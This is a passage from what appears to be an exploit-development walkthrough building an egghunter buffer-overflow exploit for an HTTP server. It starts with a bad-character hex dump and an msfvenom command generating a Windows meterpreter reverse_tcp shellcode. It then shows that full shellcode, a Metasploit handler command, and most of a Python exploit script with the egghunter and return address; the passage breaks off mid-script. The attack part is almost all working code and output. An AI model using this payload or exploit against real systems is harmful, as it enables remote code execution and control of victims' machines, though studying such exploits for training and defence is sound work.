</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381d6  <span style="color:#ae81ff">4</span>c <span style="color:#ae81ff">4</span>d <span style="color:#ae81ff">4</span>e <span style="color:#ae81ff">4f</span> <span style="color:#ae81ff">50</span> <span style="color:#ae81ff">51</span> <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">53</span><span style="color:#f92672">-</span><span style="color:#ae81ff">54</span> <span style="color:#ae81ff">55</span> <span style="color:#ae81ff">56</span> <span style="color:#ae81ff">57</span> <span style="color:#ae81ff">58</span> <span style="color:#ae81ff">59</span> <span style="color:#ae81ff">5</span>a <span style="color:#ae81ff">5</span>b  LMNOPQRSTUVWXYZ[
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381e6  <span style="color:#ae81ff">5</span>c <span style="color:#ae81ff">5</span>d <span style="color:#ae81ff">5</span>e <span style="color:#ae81ff">5f</span> <span style="color:#ae81ff">60</span> <span style="color:#ae81ff">61</span> <span style="color:#ae81ff">62</span> <span style="color:#ae81ff">63</span><span style="color:#f92672">-</span><span style="color:#ae81ff">64</span> <span style="color:#ae81ff">65</span> <span style="color:#ae81ff">66</span> <span style="color:#ae81ff">67</span> <span style="color:#ae81ff">68</span> <span style="color:#ae81ff">69</span> <span style="color:#ae81ff">6</span>a <span style="color:#ae81ff">6</span>b  <span style="color:#960050;background-color:#1e0010">\</span>]<span style="color:#f92672">^</span>_<span style="color:#960050;background-color:#1e0010">`</span>abcdefghijk
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c381f6  <span style="color:#ae81ff">6</span>c <span style="color:#ae81ff">6</span>d <span style="color:#ae81ff">6</span>e <span style="color:#ae81ff">6f</span> <span style="color:#ae81ff">70</span> <span style="color:#ae81ff">71</span> <span style="color:#ae81ff">72</span> <span style="color:#ae81ff">73</span><span style="color:#f92672">-</span><span style="color:#ae81ff">74</span> <span style="color:#ae81ff">75</span> <span style="color:#ae81ff">76</span> <span style="color:#ae81ff">77</span> <span style="color:#ae81ff">78</span> <span style="color:#ae81ff">79</span> <span style="color:#ae81ff">7</span>a <span style="color:#ae81ff">7</span>b  lmnopqrstuvwxyz{
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38206  <span style="color:#ae81ff">7</span>c <span style="color:#ae81ff">7</span>d <span style="color:#ae81ff">7</span>e <span style="color:#ae81ff">7f</span> <span style="color:#ae81ff">80</span> <span style="color:#ae81ff">81</span> <span style="color:#ae81ff">82</span> <span style="color:#ae81ff">83</span><span style="color:#f92672">-</span><span style="color:#ae81ff">84</span> <span style="color:#ae81ff">85</span> <span style="color:#ae81ff">86</span> <span style="color:#ae81ff">87</span> <span style="color:#ae81ff">88</span> <span style="color:#ae81ff">89</span> <span style="color:#ae81ff">8</span>a <span style="color:#ae81ff">8</span>b  <span style="color:#f92672">|</span>}<span style="color:#f92672">~</span>.............
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38216  <span style="color:#ae81ff">8</span>c <span style="color:#ae81ff">8</span>d <span style="color:#ae81ff">8</span>e <span style="color:#ae81ff">8f</span> <span style="color:#ae81ff">90</span> <span style="color:#ae81ff">91</span> <span style="color:#ae81ff">92</span> <span style="color:#ae81ff">93</span><span style="color:#f92672">-</span><span style="color:#ae81ff">94</span> <span style="color:#ae81ff">95</span> <span style="color:#ae81ff">96</span> <span style="color:#ae81ff">97</span> <span style="color:#ae81ff">98</span> <span style="color:#ae81ff">99</span> <span style="color:#ae81ff">9</span>a <span style="color:#ae81ff">9</span>b  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38226  <span style="color:#ae81ff">9</span>c <span style="color:#ae81ff">9</span>d <span style="color:#ae81ff">9</span>e <span style="color:#ae81ff">9f</span> a0 a1 a2 a3<span style="color:#f92672">-</span>a4 a5 a6 a7 a8 a9 aa ab  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38236  ac ad ae af b0 b1 b2 b3<span style="color:#f92672">-</span>b4 b5 b6 b7 b8 b9 ba bb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38246  bc bd be bf c0 c1 c2 c3<span style="color:#f92672">-</span>c4 c5 c6 c7 c8 c9 ca cb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38256  cc cd ce cf d0 d1 d2 d3<span style="color:#f92672">-</span>d4 d5 d6 d7 d8 d9 da db  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38266  dc dd de df e0 e1 e2 e3<span style="color:#f92672">-</span>e4 e5 e6 e7 e8 e9 ea eb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38276  ec ed ee ef f0 f1 f2 f3<span style="color:#f92672">-</span>f4 f5 f6 f7 f8 f9 fa fb  ................
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span>c38286  fc fd fe ff 
</span></span></code></pre></div><p>0a does not appear so we will count it as a badchar.
Let&rsquo;s generate the payload and start listening once we send the full payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>msfvenom <span style="color:#f92672">-</span>p windows<span style="color:#f92672">/</span>meterpreter<span style="color:#f92672">/</span>reverse_tcp LHOST<span style="color:#f92672">=</span><span style="color:#ae81ff">192.168.122.211</span> LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> <span style="color:#f92672">-</span>f python <span style="color:#f92672">-</span>v payload <span style="color:#f92672">-</span>b <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x0a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] No platform was selected, choosing Msf<span style="color:#f92672">::</span>Module<span style="color:#f92672">::</span>Platform<span style="color:#f92672">::</span>Windows from the payload
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">-</span>] No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">11</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86<span style="color:#f92672">/</span>shikata_ga_nai
</span></span><span style="display:flex;"><span>x86<span style="color:#f92672">/</span>shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> (iteration<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>x86<span style="color:#f92672">/</span>shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
</span></span><span style="display:flex;"><span>Final size of python file: <span style="color:#ae81ff">2064</span> bytes
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x26\xdd\x4c\x51\x38\xf4</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo msfconsole <span style="color:#f92672">-</span>q <span style="color:#f92672">-</span>x <span style="color:#e6db74">&#34;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.122.211; set LPORT 443; exploit&#34;</span>
</span></span></code></pre></div><p>And a shell was gotten.
The complete payload that implements our egghunter is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python  </span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket  
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys  
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:  
</span></span><span style="display:flex;"><span> server <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.122.113&#34;</span>  
</span></span><span style="display:flex;"><span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>  
</span></span><span style="display:flex;"><span> size <span style="color:#f92672">=</span> <span style="color:#ae81ff">253</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e"># bp 0x418674  </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 00 0a 0d 25 -&gt; badchars  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> httpMethod <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xC9\x85\xC9\x0F\x84\x11</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; /&#34;</span>  <span style="color:#75715e"># xor ecx, ecx; test ecx, ecx; je 0x17  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc5\xd9\x74\x24\xf4\xbd\x09\xf4\x52\x1d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x58\x31\xc9\xb1\x59\x83\xe8\xfc\x31\x68\x15</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x68\x15\xeb\x01\xae\xf5\x64\xe9\x4f\x06</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1a\x63\xaa\x37\x08\x17\xbe\x6a\x9c\x53\x92</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x86\x57\x31\x07\x1c\x15\x9e\x28\x95\x93\xf8</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x07\x26\x12\xc5\xc4\xe4\x35\xb9\x16\x39\x95</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\xd8\x4c\xd4\xc5\xae\x3b\x39\x9b\x67\x4f</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x97\x0c\x03\x0d\x2b\x2c\xc3\x19\x13\x56\x66</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdd\xe7\xea\x69\x0e\x8c\xbb\x71\x25\xca\x1b</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd2\x38\x39\xde\x1b\x4e\x81\xa8\x10\x9b\x72</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b\xd8\xe5\x52\x6d\xe6\x27\x95\x83\x4a\xa6</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xee\xa4\x72\xdc\x04\xd7\x0f\xe7\xdf\xa5\xcb</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x62\xff\x0e\x9f\xd5\xdb\xaf\x4c\x83\xa8\xbc</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\xc7\xf6\xa0\xbc\x04\x8d\xdd\x35\xab\x41</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x54\x0d\x88\x45\x3c\xd5\xb1\xdc\x98\xb8\xce</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x44\x64\x6b\x35\x67\x73\x0b\xb6\x77\x7c</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x51\x20\xbb\xb1\x6a\xb0\xd3\xc2\x19\x82\x7c</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x79\xb6\xae\xf5\xa7\x41\xa7\x12\x58\x9d\x0f</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x72\xa6\x1e\x6f\x5a\x6d\x4a\x3f\xf4\x44\xf3</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd4\x04\x68\x26\x40\x0f\xfe\x09\x3c\x75\x2d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe1\x3e\x8a\xd0\x49\xb7\x6c\x82\xfd\x97\x20</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x63\xae\x57\x91\x0b\xa4\x58\xce\x2c\xc7\xb3</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\xc6\x28\x6d\xdf\x7f\xd0\x34\xab\x1e\x1d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\xd1\x21\x95\x01\x25\xef\x5e\x60\x35\x18</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x39\x8a\xc5\xd9\xac\x8a\xaf\xdd\x66\xdd\x47</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdc\x5f\x29\xc8\x1f\x8a\x2a\x0f\xdf\x4b\x1a</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7b\xd6\xd9\x22\x13\x17\x0e\xa2\xe3\x41\x44</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa2\x8b\x35\x3c\xf1\xae\x39\xe9\x66\x63\xac</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\xde\xd7\x67\x7b\xdc\x0e\x4f\x24\x1f\x65</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd3\x23\xdf\xfb\xfc\x8b\xb7\x03\xbd\x2b\x47</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6e\x3d\x7c\x2f\x65\x12\x73\x9f\x86\xb9\xdc</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb7\x0d\x2c\xae\x26\x11\x65\x6e\xf6\x12\x8a</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\x09\x68\xe3\x4c\xea\x8d\xed\x28\xeb\x8d</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\x4f\xd0\x5b\x28\x25\x17\x58\x0f\x36\x22</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfd\x26\xdd\x4c\x51\x38\xf4</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> egghunter <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\xb8\x37\xfe\xff\xff\xf7\xd8\xcd\x2e\x3c\x05\x5a\x74\xeb\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe6\xaf\x75\xe3\xff\xe7</span><span style="color:#e6db74">&#34;</span>  
</span></span><span style="display:flex;"><span> inputBuffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (size <span style="color:#f92672">-</span> len(egghunter))  
</span></span><span style="display:flex;"><span> inputBuffer<span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#34;&lt;L&#34;</span>, <span style="color:#ae81ff">0x418674</span>) <span style="color:#75715e"># 0x00418674 - pop eax; ret  </span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w00tw00t&#34;</span> <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;D&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">400</span><span style="color:#f92672">-</span>len(payload))  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span> httpEndRequest <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>  
